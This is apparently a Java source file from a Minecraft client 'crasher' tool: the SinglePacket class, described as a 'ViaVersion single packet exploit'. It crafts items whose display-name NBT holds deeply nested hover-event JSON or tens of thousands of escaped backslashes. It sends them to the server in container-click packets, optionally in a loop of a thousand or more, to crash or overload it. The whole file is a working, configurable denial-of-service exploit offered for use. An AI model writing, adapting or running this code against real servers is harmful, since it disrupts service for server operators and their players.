package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;

import java.util.ArrayList;
import java.util.List;

public class SinglePacket extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private String mode = "Via1Def";
    private int power = 1000;
    private int size = 64000;

    public SinglePacket() {
        super();
    }

    @Override
    public String getName() {
        return "SinglePacket";
    }

    @Override
    public String getDescription() {
        return "ViaVersion single packet exploit";
    }

    @Override
    public String getArgsUsage() {
        return "<mode> <power> <size>";
    }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Mode", OptionType.LIST, new String[]{"Via1Def", "Via2"}));
        options.add(new OptionUtil("Power", OptionType.INTEGER, new String[]{"1000"}));
        options.add(new OptionUtil("Size", OptionType.INTEGER, new String[]{"64000"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.mode = values[0];
        if (values.length > 1) {
            try { this.power = Integer.parseInt(values[1]); } catch (Exception ignored) {}
        }
        if (values.length > 2) {
            try { this.size = Integer.parseInt(values[2]); } catch (Exception ignored) {}
        }
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null) {
            msgHelper.sendMessage("&cNot connected!", true);
            return;
        }

        new Thread(() -> {
            msgHelper.sendMessage("&fInitializing &6SinglePacket&f exploit...", true);

            if (mode.equals("Via1Def")) {
                sendSinglePacketDefault();
            } else {
                for (int i = 0; i < power; i++) {
                    sendSinglePacketVia(size);
                }
            }

            msgHelper.sendMessage("&fExploit completed &asuccessfully!", true);
            setEnabled(false);
        }).start();
    }

    private void sendSinglePacketDefault() {
        ItemStack stack = buildDefaultStack();

        ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
            0, 0, 0, 0, ClickType.PICKUP, stack,
            new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
        );

        mc.getConnection().send(packet);
    }

    private void sendSinglePacketVia(int size) {
        ItemStack stack = buildViaStack(size);

        ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
            0, 0, 0, 0, ClickType.PICKUP, stack,
            new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
        );

        mc.getConnection().send(packet);
    }

    private ItemStack buildDefaultStack() {
        CompoundTag display = new CompoundTag();
        CompoundTag comp = new CompoundTag();

        // JSON component with hover event recursion
        StringBuilder sb = new StringBuilder();
        sb.append("{\"text\":\"\",\"hoverEvent\":{\"action\":\"show_entity\",\"value\":[\"{name:");

        // Recursive structure
        for (int i = 0; i < 50; i++) {
            sb.append("{text:a,hoverEvent:{action:show_entity,value:[");
        }

        display.putString("Name", sb.toString());
        comp.put("display", display);

        ItemStack stack = new ItemStack(Items.STICK, 1);
        stack.setTag(comp);
        return stack;
    }

    private ItemStack buildViaStack(int size) {
        CompoundTag display = new CompoundTag();
        CompoundTag comp = new CompoundTag();

        // Build large string with escapes
        StringBuilder sb = new StringBuilder();
        sb.append("{\"text\":\"aa");

        for (int i = 0; i < size; i++) {
            sb.append("\\\\");
        }
        sb.append("\"}");

        display.putString("Name", sb.toString());
        comp.put("display", display);
        comp.put("display1", display);
        comp.put("display2", display);
        comp.put("display3", display);
        comp.put("display4", display);
        comp.put("display5", display);
        comp.put("display6", display);
        comp.put("display7", display);

        ItemStack stack = new ItemStack(Items.STICK, 1);
        stack.setTag(comp);
        return stack;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }
}
